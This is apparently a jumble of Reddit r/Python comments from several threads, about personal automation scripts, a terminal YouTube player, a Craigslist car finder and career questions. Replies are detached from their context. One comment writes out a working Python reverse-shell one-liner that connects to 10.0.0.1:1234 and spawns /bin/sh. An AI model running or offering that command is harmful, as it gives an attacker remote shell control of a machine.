I made a script that goes through a folder of JPEGs, loads them and mattes them out to a 1:1 square by adding white borders, then resaves a copy. It's for posting to Instagram where those white borders generally make the images look nicer. I've been thinking about adding a resize function to nail the right file sizes and resolutions for best quality. There are mobile apps that do it but you have to go one by one and it's a pain.

&gt;This function is more of a novelty than anything, because it gets you IP banned very quickly. I very much recommend buying lifetime access to the API, it was $20 for me in a black friday sale not too long ago. I think it's only like 50 without.

I got tasked with some boring stuff at work. There were some XML files generated by a server program, and I had to periodically grab them and convert them to excel files and give them to an admin person to generate a report. I wrote a combination of Python and a batch file that would grab them for me, rename them, and open them in excel with one command, instead of me having to go to the server and open up excel myself. Later on, creating the report itself fell to me when the admin person was transferred, so I enhanced the python script to do most of it. There are python libraries to do stuff directly in excel, so it could have been completely automated, but I didn't want to go to the trouble of getting permission to install those on my workstation.
Adguard does not like and that's incredibly unusual, I'm not even sure I can blame adguard. If I get somehow back to it, it seems fine but there might be some sort of weird ad attached.

I have a tiny web application and an almost static database except for a few updates now and then, yesterday I wrote a script that would connect to that db, dump it, and push the dump to a Gitlab private repo as a commit periodically.

You could use pandas which is included in installations like conda or install it with pip install pandas --user It can be used for much more then only excel so it shouldn't be obvious that you are automating your job :)

I‚Äôve got a script that integrates with iMessage and performs a number of actions based on text command. Primarily used for clocking in and out more easily, but also to get the computers IP address, get weather for the office and other silly things. Also have a script to scrape my reddit upvotes and based on the post type do a thing to save locally. I‚Äôve got a script running on my MacBook that pops an alert when my battery is low. Because the Notification Center isn‚Äôt intrusive enough to get my attention and my computer would die mid meeting. And finally a script that does different launch actions based on time of day. Opens different apps, signs into work accounts and vpn, etc.
We have a shared Outlook inbox that mostly captures status emails from automated ETL jobs. That's all well and good, but someone decided it would be fantastic to have the job that runs every 5 minutes send a "Success" email... every 5 minutes. Months later, this inbox is nearly full. I wanted a way to clear out some of the older messages, particularly these useless "Success" emails. Ended up writing a script that depends on the `pywin32` package to read Outlook messages in that inbox, select those that match by subject, and delete them. I was only permitted to get rid of messages from at least a month out, so I added that criteria to my filter and let it rip. Maybe 30 minutes and 7000 emails deleted later, it's not perfectly clean now, and never will be; but it's better than it was. Best part is I rolled up the process into a custom PowerShell command, just so it can activate the right virtual env, start the script, and drop the env when it's done. Every day when I start up I happily type `deleteoutlook` into the terminal and watch it fly. :)
You wanted to create something terminal :) It's a good idea, congrats.
I would to see the code mate.
I just finished a script that scraps for audiobooks uploaded online and looks up each of them from goodreads. So that I can sort by rating, genre and other filters and know exactly what available book to listen to next. It looks like there are over 66000 posts to get through and it's been scrapping for the past 3 hrs already. A long night ahead indeed.
We have monitoring dashboards on TVs in work. With so many different servers and services it was tedious finding the alert in the monitoring platform, now I have a script that cycles through the dashboards and prints out a direct link to the alert so I can open it directly and action it. It's hacked together but it does use asyncio at least! Oh and it prints in colour depending on the severity of the alert.
&gt; But when I look at github, python projects have few contributors and few stars sounds like you're not good at searching and/or using github. python projects are everywhere with lots of stars and contributors &gt; There's a huge community of beginners but its not as professionally prevelant as Java or .NET when I look for jobs my area (Houston) I'm just not sure why. technologies are definitely regional. i dont know anything about houston, but it just might not be widely adopted. it could also be the type of job you're searching for. you're more likely to find python in science, data analysis, web development, and sysadmin roles whereas java is more prevalent in desktop and mobile applications, data engineering, and i guess web development too that being said, i've used python at every job i've had even if it wasn't the primary language in the tech stack, but i've only used java when it was the primary language. &gt; But I think there might be a big leap from beginner programs to building large applications. large applications will be difficult for beginners regardless of the language. documentation and other resoures are more valuable in that regard it could also be that python programmers are easier to find and that you need fewer of them. i don't know many people who are that eager to write java another thing to consider is that java has been a primary player for decades. there are many systems built on java that won't be rewritten anytime soon
How many of them have you read so far
We have a very convoluted Jira process at work. Management love to add endless fields and tabs to enrich their graphs and help them micromanage their developers. I wrote a script to pretty much automate filling it all in. Made my life much much more bearable.

I also learned that pytest was much better than unittest. But I also manage a twisted project that uses trial, which is based on unittest. It simply works best with twisted and reactor.
Here's a more literal interpretation of a 'hacky' script, a reverse shell in one line python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
Realized I misread the problem. Here's the code I think you are looking for. lst = [1, 2, 3, 2, 4, 6, 3, 6, 9] for i in range(1,4): print(' | '.join([str(i * j) for j in range(1, 4)]))

That's one of the BIG problems with electric cars, I've never bought a new car in my life, but the idea that my next car could have a $10000 maintenance event, months after I bought it? With completely electric cars, the battery is most of the car, Teslas give you both a trunk and a frunk, because it's just wheel motors and a huge battery. I want to love them, but there's still way too much downside to buying used, and I have no way to charge at home because I live in an apartment.
You still need xlrd or the other excel library to work with the files though.
I would love this if it could follow the youtube's "dynamic" play-next playlists.. I don't have my playlist precompiled and filled, I just let the youtube do the thing and skip if it is shit.

No matrices? WTF? Matrices *are* essential numpy, and they are essential for ‚Äúbasic scientific computing.‚Äù
how to start it?
Cool stuff. I agree with you about listening to YouTube music without the video. Great work im gonna try it
It seems you are missing a dependency, as I had to install python-vlc to get it to work.
No but you'd need to know how to install Python &amp; pip via the python command line. Then use pip to install the app from pypi
The general consensus is that the battery will last a few years, so shouldn't be months into your purchase, if you're talking about second hand then you should probably get insurance for the battery, or some other kind of battery plans that manufacturers have. As for apartment building, it might be the case that when electric cars become more prevalent they'd start having them in the car parks. I'm in an even worse position where I just don't have a regular personal parking space at all, just waiting for supermarkets or something to catch on so I can charge cars up when I'm shopping or something.
I hope there was something like that for Spotify. Yes, there are CLI clients but you must run full-blown Spotify at the same time. It‚Äôs a requirement of the API I think.
Is there an option to download the music as mp3, too? Or an export of the playlist to parse it to YouTube-dl ?
Cool! How do you think, is it hard to create similar for Google play music?
So this downloads first and then plays? I.e no streaming?
Use the [task scheduler COM API](https://docs.microsoft.com/en-us/windows/desktop/taskschd/task-scheduler-objects) which you can access using Python's COM interface
\&gt;As for apartment building, it might be the case that when electric cars become more prevalent they'd start having them in the car parks. Yeah, that's the problem...car parks, are you Brittish? Where I'm at (in America) there are tons of apartment complexes that are so small that the owners will never put in a charger (and they will never put solar panels on the roof, and they will replace my toilet with one that costs half as much if it breaks, and they have the right to raise my rent if they do any "improvement" to my unit, like installing an electric charging station). If I wanted to charge my electric vehicle, I would have to run an extension cable from my unit downstairs to where I park.

Does your country provide free tuition for service? If so get a degree. If not, start searching job boards for jobs that might interest you, read what languages/tech stacks they want and then do some projects that are similar. Post these projects to a public github. Hopefully by the time you‚Äôre out you have a good repository of projects related to technology in a field you want to enter. Also creating a blog an filling it with ‚ÄúI learned so and so on this project today‚Äù style posts that show an understanding doesn‚Äôt hurt.
Fucking weeb
curious though. will the play via this terminal count towards the youtube count for the video??

Do you want to learn to code or just have the program work? If you want to learn, getting through a tutorial that includes functions,lists or dictionaries, and loops,would help out a lot. Otherwise, I‚Äôm sure someone will step in and just write the code for you. I could but I‚Äôd need a day and have some questions about the ‚Äú16‚Äù.
Learn! I'm going through the SoloLearn app right now, but I don't know if this code is something I'll just have to leave for a bit later or whether I have the knowledge now to make it work and I'm just being stupid.
I really like Annomator. Great work. How can I get Annomator Pro?
This is fucking rad.
You could put your code inside a method, check if none of the rolls are above 16, and if they aren't, you just run the method again from within itself. This is called recursion
I've uploaded it here: [https://imgur.com/a/5K16BF0](https://imgur.com/a/5K16BF0) I have two monitors so had to make some changes to the image to fit both.

I am using youtube-dl to extract the videos stream url. I don't think it increases the youtube view count.
No, it's streaming. Nothing is downloaded as of now. Although, I might add that as a feature in the future.
Another Terminal based YouTube player that I extensively use : https://github.com/mps-youtube/mps-youtube Features as provided on the official page : Search and play audio/video from YouTube Search tracks of albums by album title Search and import YouTube playlists Create and save local playlists Download audio/video Convert to mp3 &amp; other formats (requires ffmpeg or avconv) View video comments Works with Python 3.x Works with Windows, Linux and Mac OS X
hmm... I would've to look into it. If there is a stream API for it (like youtube-dl for youtube) then it would be a piece of cake.
yes, if an API exists, making it for spotify will be easy. I will look into it.
Not for now, I will add it as a feature soon.
Thankyou Erica1968. You can get access to Annomator Pro by sending your github username to [annomator@gmail.com](mailto:annomator@gmail.com). You will then be sent a link to the private repository on github.

Hmm, I will have to look into how next songs are fetched in those. Although, if you could find the URL for such a playlist this would work for you.

I might give it a go next week. I'll let you know if I come up with anything that works. It will probably not me a great system if it does work, but I'm sure someone else could then improve on it.
I will fix it ASAP. I replace vlc with mpv, not sure why is it still asking for it.
Wow... that could be such a short program. I'd encourage you to learn about loops and functions.
It honestly started out as a joke, after playing with the new MS intellicode ai, I thought hmm lets see what python can do in fifty-lines-or-less :) I hope you write some awesome code with it!

I just wrote two scripts, one writes, other reads. It opens a png and a file. Reads the file bit by bit and writes to png pixel by pixel. If bit is zero, turns current pixel's current color's last bit into zero (mod2) otherwise one. A 4 mb 1920x1080 file can hold 1mb and filesize hardly changes (depends on the compression) and file looks identical. Because a very minor change in a pixel is hardly noticeable. I did this to waste some free time.

Is terminal on GUI environment really minimal? There must be a middle ground between a terminal and a browser.
If you have a playlist you can directly use youtube\_dl, i don't understand
Sad that it doesn't work on windows
Easy going pal Listen to a playlist send to me, after three songs I tell myself that‚Äôs a great one. Hit d and it downloads it in subfolders . Never mind Your way. Listen to it, say to myself it‚Äôs a great one, open another terminal , type in youtube-dl -i --extract-audio --audio-format mp3 -o "%(title)s.%(ext)s" PLAYLISTURL and work on. If it‚Äôs scriptable, do it. So now you understand my question
Giving this a go when I spin up another vm. Also props for crystal castles!
Btw it‚Äôs possible to copy the url to clipboard and use parcellite with a script. Easy, too. But why do not use an automatic directly?
okay, I understand now
Awesome idea. Could use this for the work desk.
I strongly advise you to start from reading a book for beginners (in programming and Python). Learn about simple algorithms, flow control and code reuse first. This is crucial for programming and will help you a lot, because many online courses assume you already know these things.
In the UK only a small number of companies use python. In the US it might be very different.
There‚Äôs some setting on Windows that will allow you to change the default application for files (right clicking may do the trick). I‚Äôm not familiar with the specifics but, I imagine, a simple google will suffice.
So it should work via the Linux subsystem in Windows 10?
The rule of thumb is: *a method takes an argument if its documentation says so*. Try calling `help()` function on a class or method in interactive mode. Many modules have extensive documentation, often with examples, but sometimes you have to go online to learn more (i.e. on a module creator's web page).
dont feed the troll
What operating system?
Mostly stuff for work. We have a custom in house crm which is a bit of a pain to use for a lot of things. I used python and automate the boring stuff to automate some of the boring tasks! One thing we have to do every month is update the date field for 50-100 entries. These are projects which we have logged on the system. Management look at the number and value of projects which are in the system for the current month to make predictions about where we will end up. We always have way more on the system than there are coming in that month. Unfortunately you can't bulk update them, you have to do it manually one by one and and it takes about 10-20 seconds of clicking and typing for each one. I made a script which takes the number of projects to move, and the date to move them to, then let it run and go for a coffee whilst it does it all for me. Another one was for updating our stock take. We have to type 1 into a box for every item we still have. And we have about 200 items. Usually there's either none or just 1 or 2 missing. So I modified the project script to fill of the stock take with 1 as a value, then I go back and change the couple of items that are missing. It was a pain point that made me learn python and now I'm using it for all sorts of different things. Really helping me out with my personal development.
Looks cool, but please, don't shift the numbers. Jumpy clock is hard to read :)
This was one of those odd, single-use scripts; I had a bunch of screenshots from my 3DS that were, well a bit of a mess. As the 3DS has two screens, screenshots are broken into two image files (top_xxxx.png and bot_xxxx.png). So I cobbled something together with python and PIL to merge them together in a nice way.
i will look into it thanks
Okay, maybe you can get something out of Windows logs then
I was working on just this for windows at one point because I do the same thing. Problem was getting python-mpv working in windows which there now seems to be a linked issue with a solution. Might look into it again if console resizing with pdcurses in wincon doesn't drive me insane. Reading the changelog seems that some work might have been done towards fixing it.
Yeah, at the minute it takes each line and centres it, making it jump around if it gets any longer, but I might give each value its own centre point so there is less jumping
your comment made my smile merci
And Spotify quality is light years ahead of most youtube recordings, unless you're using ipod headphones then you're better off using something more quality orientated. Would love this to get to the Spotify API. I don't believe you need the application open at the same time. Saved.
Any chance for a small vu meter integration? Would be mint.

I made a small script that uses praw to grab the current top quote on r/quotes. I then have Conky run the script and pipe it to lolcat and the output is displayed on my desktop for a neat quote-of-the-day type desklet.
That's not the problem. I know how to change the default program. But choosing spyder.exe doesn't do the trick anyway.
That's cool! Do you plan to share it? I also wanna play it!
It is, however, used extensively by the NHS.
Really. I wouldn't have expected that.
Thank you!
the whole point is that the error does not lead to a solution
it lacks windows support basically because of urwid (something that can easily be replaced). I will write the UI again for windows if I get time. [https://github.com/urwid/urwid/issues/152](https://github.com/urwid/urwid/issues/152)
thank you ill give it a try
Maybe it doesn't lead _you_. It doesn't mean it won't lead anyone.
I am using urwid for UI. It will be very hard to implement it. This is the reason why I couldn't create a visualizer. I am thinking of replacing urwid in the near future for better visuals, will update it here!
Should work for VS Code. But for each and every editor it might be different.
I already googled the error and its solutions
Then what's the problem with posting it?
Do you still get to listening ads? Or is ad-free?
no problem at all
For testing, using the stdlib is fine - `pytest` is the hippest option, but `unittest` is fine, and it saves you a dependency. For debugging, I like `pudb`, but unlike testing, you don't have to standardise debugging tooling within a project (although try to avoid making the project difficult to attach a debugger to).
So, what's the error?
We are musically the same person lol. Cool application, great taste in music!
it's ad-free. Thanks to [youtube-dl](https://ytdl-org.github.io/youtube-dl/index.html)
haha, we've both got a great taste! I hope you find this useful. Let me know if you want my playlist xD
Had same problem. Install pyyaml-5.1 not pyyaml-5.1.1
Wow, that's quite the two-page sales pitch for a Udemy course.
okay got it!
Like about 500?
Awesome. Just what I need it.
Probably not, as the audio subsystem will be different in both WSL1 and WSL2. Though I'm not entirely certain.
As a technical manager for over 30 years I deeply appreciate the dedication of u/aphoenix and other mods who serve their communities almost entirely altruistically for the benefit of all. Thank You! Some of the most vocal users of this sub, and others, are clearly very experienced, advanced and toxic to all but their own level/10X coding brethren. Perhaps a new subreddit could be created for all the elitists and entry to said community is essentially conditional on contribution review. Best of luck to the savants. As an experienced manager I am grateful to those who have helped me in my career, beginning with K&amp;R C, assembly on lots of CPUs, Java and transition into management. These days I write some Python experimentally and lurk in r/Python and have asked a few questions under a few accounts over the last few years. For those who recognize that we all need help learning, growing and mastering in our own way - thank you. To those who are hostile to n00bs, I hope someday a manager, mentor or guide takes you by the hand and helps you mature emotionally and intellectually. Toxic contributors need to be PIPed, moved to r/ElitePythonLords or removed for the good of everyone else.
I've in the past used CLI visualizer with transparent background for desktop based VU meter, was on 14.04 so I can't remember exactly. Perhaps I'll just open a 2nd window in terminal and have it side by side. Option for this within would be amazing though.
How is it in terms of quality? Do you fetch the highest resolution possible?
Now make one for spotify.
Great! When you get a chance, check out the repo to get more familiar &amp; see if you‚Äôre interested.
What about mac?
You are the first person I know that likes that "recommendations".
I thought YouTube dl, well, downloads the video, and extracts the audio. Does it allow streaming? Or does it need to download the full video before the audio starts playing?
[spotifyd](https://github.com/spotifyd/spotifyd) works great instead of having to run the full Spotify client. If you start this it will show up as a "Spotify connect" client. So you should be able to use any other client (terminal or not) to control this instead of having the full application running.
YouTube Music App.... Ohh wait...

1) This post is probably more suited for r/learnpython 2) Is your app acting as a server? Why do you need a snapshot vs using a standard debugger such as pdb?
Its super popular for bioinformatics, even things that are more basic and aimed at getting molecular biologists into it such as qiime2 are mainly written in python with a bit of R.
Looks awesome. You should post this on some of the Linux subreddits.
Recreating a simple version of a big company monstrosity is a noble goal. When your goal is not profit and datamining you can create something better.
This really whips the llama's ass. Thanks :)
Alright I switched 'run,py' for '\_\_main\_\_,py' it's way better than my last setup.
&gt; I also have a top secret security clearance so does anyone know of job (titles) I could get? A military background, TS-level clearance, and some training in cybersecurity is a pretty good combination. Learning Python can certainly be part of that. The particular job titles are rather varied; perhaps a better approach to orienting yourself to the field is to read info from organizations like [ISC2](https://www.isc2.org/), [Sans](https://www.sans.org/), and the [EC Council](https://www.eccouncil.org/).
CODE: [https://github.com/imharrymargalotti/CraigslistCarFinder](https://github.com/imharrymargalotti/CraigslistCarFinder) Hi Reddit, As promised here is a link to my git repo with source code. If anyone wants to tailor this for themselves and needs help feel free to PM me for help. &amp;#x200B; Please read the readme as there have been some tweaks, and it details how to set it up, and what is I'm currently developing for it. I intend to keep working on this one at least until it finds me a good used car, so check the repo for updates.
What would be cool would be if you could make a Dockerfile for it :) Since I don't have ubuntu or linux, only Mac, but I want to try it but do not want to mess up my OS with dependencies

First comment.
I made this app as a productivity tool literally years ago, but recently had the idea to add the ability to save and load tasks. I decided to give it a go, but also to use it as a test-bed to try out some GUI implementations, something that I think is very hard to get right. This is what I settled on in the end. I hope you can get some use from the app, but also if you're interested please dive into the implementation and let me know what you think! Any comments, questions and requests welcome!
Second comment
Yes, but I'd still like to know.
Did some more snooping, found something that might help a few people in this thread. Spotify, Google Music, Youtube, Plex etc etc support. https://github.com/tizonia/tizonia-openmax-il
Third comment.
Data science
I think you could definitely clean up the checkIfReplied and parseDetails functions lol
V1 for a reason lol
I think it's great you're doing this, but I couldn't get through it because the looping animation of your logo drove me bonkers. Please consider making it stop or scrolling out of sight.
Why not? I know everybody has a wastly different experience when it comes to this (for normal videos as well), but I have an account for music listening (maybe "well trained") and the recommendations are generally much better than any other platform (e.g. spotify).
btw it would probably be a lot easier to create a car class. Then things like make, colour, age etc could all be properties. It would save you from having to pass around a load of arguments. Also you could probably stick all this sort of stuff in a config file so you can change the easily. fromaddr = '@gmail.com' username = '@gmail.com' password = '' conditionsIWant = ['new', 'good', 'like new', 'excellent'] milesIWant = 108000
This is how I've been sending emails using Gmail. &amp;#x200B; message = ( f'Subject: \\n' + message ) try: smtp\_server = smtplib.SMTP\_SSL('[smtp.gmail.com](https://smtp.gmail.com)', 465) smtp\_server.login(sender\_email, sender\_password) smtp\_server.sendmail(sender\_email, recipient\_email, message) smtp\_server.close() except Exception as e: logging.error(e) return
`virtualenv` is the solution.
what does this offer that isnt in youtube-viewer? i m using it for year now and i m just curious ^^
So in my personal version, it uses environmental variables, but I thought it would be better to be more explicit when someone else looks at it. I do like the car class idea a lot
That is not what you should have done at all.
I wrote a script to scrap job listing sites, and send automatically send "customized" resumes and cover letters out based on keywords in the job listings. I'm still getting emails and calls from potential employees despite already finding a summer job. (I'll be heading into my sophomore year of my computer science degree this fall.)
/r/learnpython
Thanks for the feedback üòä. I will make it stop at time of reading.
Aha yee. I'm actually trying to build and execute it via Dockerfile now but getting imports errors due to imports using the .filename. So maybe i'will try to do it myself.
Shvacas da je ovo thread o Pythonu - programskom jeziku?
Spyder doesn't work like that. There might be some clever workaround but in normal usage you need to open it first through anaconda then do file open.
Could we get more details? Because it's pretty vague.
Da.
Which script editor are you using. I use Jupyter, but I think I like the dark background better, and the output below
Im using PyCharm
Is it free to download?
Okay, thank you!
on mobile rn but looks like your functions aren‚Äôt indented so they‚Äôre not in the class. Class methods can take a ‚Äúself‚Äù keyword as a first argument so that when an object calls its method, the method has access to the objects data. For example if class X has a field Y, a function printY can be defined with the header def printY(self): ... and ‚Äúself‚Äù is passed as the first argument when it is called as `x.printY()` even though it doesn‚Äôt appear between the parenthesis
Is it free to download
Getting this error when I have installed all requirements and dependencies..:/ `(virtualenv) macbook-pro:yTermPlayer kalle$ python __main__.py` `Traceback (most recent call last):` `File "__main__.py", line 11, in &lt;module&gt;` `from .music_api import YoutubePlayer` `ModuleNotFoundError: No module named '__main__.music_api'; '__main__' is not a package`
There is a premium version and a free one i have the free one
so its an indent issue ? possibly, only thing that drives me nuts about Python is its pickyness for indents

There must be a gazillion python tutorials for beginners on youtube, for free.
probably not needing to get the video and access it by webbrowser :) = not distracted by video if you only want the audio :D
Nice idea, but a bit too cumbersome to use. Some feedback. I would spend a bit more time to clean up the variables so your potential users don't have to create a Dropbox directory to run your code.
Heheh. PHP array generator. Don't shoot me yet!! Ok so backstory: I work on an IoT platform for digital cinema equipment. We map "services" defined in our DB to specific device models that use those services. These are mostly SNMP based, though not entirely. Some of these services must trigger alerts when incoming values match (or don't match) a preset value. Some are "pseudo-services" that hold aggregated values from other services. You get the idea. They're all over the map. And when we add or change a device, it may or may not use an existing service definition. There are tens of thousands of these. Part of my job is to write migrations to correctly generate these services for new and existing devices. I get a spreadsheet from operations with the basic info. At first, years ago, writing the migrations meant a lot of data entry turning spreadsheets into arrays. It was very time-consuming and error-prone. Enter: `phparray.py`... the sanity-saver. I copy the spreadsheet into an Emacs org file as a table (co-workers use CSV instead). Then I feed it into my hack. Hack spits out a PHP array with keys named after column headings. I redirect stdout into a file or `xclip` and paste it into the (PHP) migration. Job is 95% done at that point. TL;DR: a Python script that turns Org tables or CSV files into valid PHP arrays.
i understand that you have no idea what youtube-viewer [is](https://github.com/trizen/youtube-viewer)...it is CLI youtube interface made in perl, it isnt youtube viewer in web browser
Since I'm terrible at programming, all I make are hacky scripts/apps. Mostly I use them to offload my work to someone else. The two main ones I can think of are: * A web app that uses SNMP to connect to our firewalls and grabs a list of VPN users logged in, their duration, and data transferred. It then SSH's into our phone system to grab their SIP phone information. Finally, it grabs their call statistics from our monitoring software. It displays all this data in a web page for the Helpdesk team. This gives them good info and I don't need to give them access into any of my stuff. It works, but the code is hacky, at best. * The second one is a web page that takes in some variables like address, and internet IPs and spits out config templates for branch network equipment. It also updates our IP management system and sets up our Monitoring software to start monitoring these new devices. Now I don't need to be involved when we setup a new branch office.
I've played around with it and helped Python beginners use it. It works well for experimentation and learning. It's one of the easiest ways to deploy a Python application to the web. Not only is the process straightforward, it's well-documented. Its main strength is also its main limitation: it's designed specifically for Python so (of course) it doesn't really have support for other languages. Naturally, you can serve pages that contain Javascript, as that runs in the browser. Because it's easy to get started and has a free tier, I would try it out and see what you think.
Oh. But this script does NOT offer any video in CLI interface, only audio. so I guess that would be the difference.
other one is this one has ncurses interface (i would guess tho) while youtube-viewer is prompt based ...i was more looking for OP's opinion since i m pretty sure he knows youtube-viewer, thanks anyway :)
Oh and I thought of another one! Devdial aka pushnoise... Pages all the phones in the dev office (Asterix) and plays 30 second clip of "Push It" (or one of a half dozen other clips) every time any dev pushes code. We recently moved and haven't got it up again. But it's pretty cool. And very hacky
Look into Flask or Django for this. If all you need is a single page that does one thing, Flask is probably easier.
Base filters: \* query = ... \* search\_titles = True/False \* has\_image = True/False \* posted\_today = True/False \* bundle\_duplicates = True/False \* search\_distance = ... \* zip\_code = ...

I can't get the filters from 'condition' to 'auto\_bodytype' to work correctly. Here's my search string: cl\_h = CraigslistForSale(site='sfbay', category='cta', filters={'min\_price': 15000, 'max\_price': 30000, 'make':'Ford', 'model':'150', 'min\_year':2015, 'max\_year':2018, 'search\_distance':250, 'bundle\_duplicates': True, 'max\_miles':50000})
I have so many "why?". I don't get the point of making a new language, let alone learning it. I've tried answering those questions by looking reading around, but no clues. If it's a learning exercise, then it's great for you, but other than that it looks like yet another vanity project... Which it's nothing inherently bad, until you start pushing it for no valid reasons whatsoever (see above).
Woow, nice!! I heard about Django before, but not Flask. Which one is more secure, like I don't want my server hacked or my backend script stolen. I'm aware of basic secure python coding, but not in a web environment.
Game engines are definitely a limitation of the Python ecosystem. You might want to consider Godot, which doesn't use Python, but uses a Python-inspired language. I'm honestly a bit leery of using a language that's almost Python because I think the minor differences could be frustrating, but others might not have my experience. Apparently, it also has actual Python bindings, but I'm not sure how complete those are.
Both are generally a lot more secure than I'd expect your code to be.
Glad to hear that! Thanks a lot.
Thanks but they don't need to create the Dropbox folder. You can store the database file anywhere you want, just set the `DB_FILE` accordingly. I put it in Dropbox to sync the database on all my machines.

An idea for new feature: in `zsh` you can define a precmd/postcmd hook, check the current directory and collect most commonly visited directories to offer next to bookmarks or as suggestions to bookmark.
I'm an data analyst and find a particularly huge amount of increase in use of Python due to data science. Using Python for machine learning, simple analysis and automation with cloud platforms as Azure, Google Cloud et cetera have become increasingly more easy and interesting for my line of work. Do note, this is from my perspective coming out of my field of work, but I feel this has had an impact on the overall increase of Python users.
Is there any point in importing requests within this? Also the return True doesn't seem to have any effect #check if the user connected to internet def connection(): try: import requests res = requests.get('https://www.google.com') return True except: print "You need to be connected to internet in order to use the application" import sys sys.exit()
Thanks. There are projects that gather most commonly visited directories, like autojump or z. In my case I wanted to use bookmarks that I define.
Thank you guys! I found some more in depth videos just now that are helping. I'll get my skills up more before I ask dumb stuff again lol
Great idea
I wrote a script to automate mouse scrolling with xdotool for linux and python. I read pretty quick and i get tired of scrolling so i wrote a script that would read a file for the amount of seconds to sleep between downward scrolls and a pause feature. It also speeds up from one scroll a second to the desired speed so its not just taking off on ya. I use i3 and have a hotkey to turn on scrolling.
yes, I've fetched the highest possible stream quality using pafy. I should add a feature for lower quality for the slow internet users in the future if its necessary.
Hey guys, I made a simple python script to play one of my favorite games Duck Hunt. I used Pyscreenshot, PyAutoGui and openCV-python to make this AI. Here is a link to the code [https://github.com/AI-Olympics/Duck-Hunt-AI](https://github.com/AI-Olympics/Duck-Hunt-AI).
How often were you hitting their servers?
&gt;Should I make a separate program that runs a basic example and tests that the output is correct? Yup. Maybe at the function level instead of at the process level though. And do it with something where testing and results are a first-class citizen, like pytest. &gt; I don't see how that would help as clearly I wouldn't ship an example that didn't work, This is how you _know_ the example worked. Not by testing by hand. That doesn't scale.
you make sense more than the rest love it
I forgot to mention pafy, I am using that to fetch the URL to the audio stream
Honestly, I didn't know it existed when I conceived this idea. Nevertheless, it was just a fun little project which helped me learn a lot of things. And I think mps-youtube has too many features which I don't need. ytermplayer is something very minimal and just the right thing for me.
If you're trying to run it by cloning the github repo and not installing it via pip you need to make a few little changes in the code as follows: [https://github.com/TimeTraveller-San/yTermPlayer/issues/2](https://github.com/TimeTraveller-San/yTermPlayer/issues/2) It's a very silly problem and I will fix it asap.
Thank you!
Hire different from pushd/pulld/dirs from bash is it?
I'm just a hobby programmer so I have most of my programs in one folder with the format being something like "N - 20 - Wohoo.py", where the first letter denotes Finished or Not Finished and the number denotes the order in which I've written them. Because I sometimes delete programs which messes up the numbering, I then decided to write a script (in a different directory) that redoes those numbers. Worked fine, but recently, it for some reason completely fucked everything up so I got frustrated (Windows doesn't have an undo function for such things AFAIK) and deleted the numbers from the names and the script itself.
I am laughing out loud.. maybe open a ssh session from another machine to kill the script next time it goes all skynet on you! Great video!
Take a look at pytest
Thanks... It was really terrible when I couldn't control the mouse. First I thought of removing that from the video, but since I had learned an important lesson from it I didn't remove it.
Hi! Since February or March, I've been working on a set of Python projects for generating markup documents (the motivation was that i don't like writing Jinja templates). They are ready (and available on PyPI) now, so i thought i would share them here: - `markyp-html` is a (fairly basic) HTML implementation that lets you create web pages without Jinja templates. - `markyp-bootstrap4` is a pure Python Bootstrap 4 implementation on top of `markyp-html` (layout, components, almost everything...). It's similar to `react-bootstrap`. Have a look at the [repo](https://github.com/volfpeter/markyp-bootstrap4) or the [demo page](https://volfpeter.github.io/markyp-bootstrap4/). - `markyp-rss` is (obviously) an RSS2 implementation.
Next step: plugins with random colors, and skins. Essential.
Ahaa thats why that problem came. Having other problems that it can not find libmpv.so , but I think its more related to the Docker container I'm trying to install it on.
Ah, very nice. Thanks, I'll give it a try at work tomorrow üòÅ
I don't use those but this is what I found: https://www.eriwen.com/bash/pushd-and-popd/ . "*Most Linux environments have a way for you to put paths on a stack (push) and then take them off in reverse order (pop).*" In my case, I can assign a bookmark to a folder and using that bookmark I can access it quickly. It's like a URL shortener but for your local machine for visiting a directory quickly.
You must try pushd. At least it will give ideas in another related ideas to your project.
For the front-end, you might want to have a look at [Jinja2](http://jinja.pocoo.org/). (Or give my project, [markyp-bootstrap4](https://github.com/volfpeter/markyp-bootstrap4) a try.)
Don‚Äôt get me wrong. I used to love Medium, but it‚Äôs not a free platform anymore. If I want to read your post I have to pay 5 dollar per month. So.... I don‚Äôt love Medium anymore. (Luckily for me, I‚Äôve got a free to read chromium plug-in, but I guess that‚Äôs like cheating)
I really like it. Yes please solve the shifting, but it really looks Nice! Keep up the good work
python-mpv is just a wrapper around the mpv player you're missing libmpv because you haven't installed mpv on your distro. I should mention this more explicitly in the readme. Let me know if the problem still persists.
Best option for what?
Your pain combined with hey there‚Äôs ducks over here is hilarious. That was amazing! Using openCV isn‚Äôt AI though. You identified a color to click on, but you didn‚Äôt train your bot to become better. An AI could use the whole frame and figure out where the duck is. Combine that with the score or just a pass fail and the bot would get better over time.
I use unittest. I have 970 or so tests in my project and often run single tests, groups of tests or groups of groups of tests. I don‚Äôt know how to make pytest do that.
I already answered this [here](https://www.reddit.com/r/programming/comments/c6oym4/neutron_a_simple_extensible_and_efficient/esadru5?utm_source=share&amp;utm_medium=web2x), but I'll summarise what I said. *"Why did I make this?"* *~~Because I was bored~~* Mainly to learn more, but also because I felt annoyed by how sluggish the indenting and [Off-side rule](https://en.wikipedia.org/wiki/Off-side_rule) was in python. Neutron inherently has the capability do do anything python can, because it was made in python. I also made this because I was going to (and still am going to) extend the project to something different, a programming language with changeable syntax during runtime, and structs and switch statements, unlike what is in python. Mainly changeable syntax at runtime though. I hoped that when I posted this here, some people would relate to this. Thats part of the *"why?"*. Thanks for the feedback/thoughts.
**Off-side rule** A computer programming language is said to adhere to the off-side rule if blocks in that language are expressed by their indentation. The term was coined by Peter J. Landin, after the offside rule in football. This is contrasted with free-form languages, notably curly-bracket programming languages, where indentation is not meaningful and indent style is only a matter of convention and code formatting. *** ^[ [^PM](https://www.reddit.com/message/compose?to=kittens_from_space) ^| [^Exclude ^me](https://reddit.com/message/compose?to=WikiTextBot&amp;message=Excludeme&amp;subject=Excludeme) ^| [^Exclude ^from ^subreddit](https://np.reddit.com/r/Python/about/banned) ^| [^FAQ ^/ ^Information](https://np.reddit.com/r/WikiTextBot/wiki/index) ^| [^Source](https://github.com/kittenswolf/WikiTextBot) ^] ^Downvote ^to ^remove ^| ^v0.28

How you do it with the VPN? which one do you use?
This is nice but you probably should have just shared it with your inner circle. Google will see this and break it within the next few weeks probably. Great work though!

Lol wrong python
Python is used intensively in artificial intelligence, big data and data science. The projects that you can find in github are not of this type.
